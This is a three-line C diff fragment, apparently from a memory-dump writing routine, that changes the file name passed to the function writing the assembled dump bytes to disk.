     char* dump_file_bytes = get_dump_bytearr(osvi, moduleInformationList, moduleInformationList_len, memfile_list, memfile_count, &dump_len);
-    write_string_to_file(fname, dump_file_bytes, dump_len, TRUE);
+    write_string_to_file(dump_fname, dump_file_bytes, dump_len, TRUE);
 }
